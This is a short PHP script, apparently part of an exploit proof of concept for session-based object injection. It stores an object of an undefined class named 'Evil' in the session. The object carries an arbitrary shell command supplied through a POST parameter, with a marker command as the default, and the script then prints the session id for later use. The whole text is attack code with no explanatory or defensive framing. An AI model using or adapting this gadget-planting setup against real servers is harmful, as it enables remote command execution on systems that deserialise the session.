<?php
session_start();
$cmd = $_POST['cmd'] ?? 'id > /tmp/preproof';
$_SESSION['x'] = new Evil($cmd);
echo "sid=", session_id(), "\n";
